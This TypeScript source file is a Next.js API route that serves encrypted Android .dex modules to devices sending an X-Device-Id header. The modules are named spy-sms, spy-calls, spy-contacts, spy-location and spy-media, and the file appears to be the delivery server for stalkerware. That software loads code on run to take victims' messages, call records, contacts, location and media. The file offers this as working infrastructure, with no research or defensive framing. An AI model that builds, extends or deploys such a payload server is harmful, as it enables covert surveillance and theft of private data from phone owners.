import { NextRequest, NextResponse } from 'next/server';
import { readFile } from 'fs/promises';
import { join } from 'path';
import { existsSync } from 'fs';

/**
 * GET /api/module/[name]
 * Serve encrypted .dex module to authenticated devices.
 * Files: public/modules/<name>.dex.enc  (not committed to git — upload after build)
 *
 * Auth: X-Device-Id header required.
 */
export async function GET(
  req: NextRequest,
  { params }: { params: { name: string } }
) {
  const { name } = params;
  const ALLOWED  = ['spy-sms', 'spy-calls', 'spy-contacts', 'spy-location', 'spy-media'];
  if (!ALLOWED.includes(name))
    return NextResponse.json({ error: 'Not found' }, { status: 404 });

  if (!req.headers.get('X-Device-Id'))
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

  const filePath = join(process.cwd(), 'public', 'modules', `${name}.dex.enc`);
  if (!existsSync(filePath))
    return NextResponse.json({ error: 'Module not deployed yet' }, { status: 503 });

  try {
    const data = await readFile(filePath);
    return new NextResponse(data, {
      status: 200,
      headers: {
        'Content-Type':  'application/octet-stream',
        'Cache-Control': 'no-store',
        'X-Module-Name': name,
      },
    });
  } catch {
    return NextResponse.json({ error: 'Internal error' }, { status: 500 });
  }
}
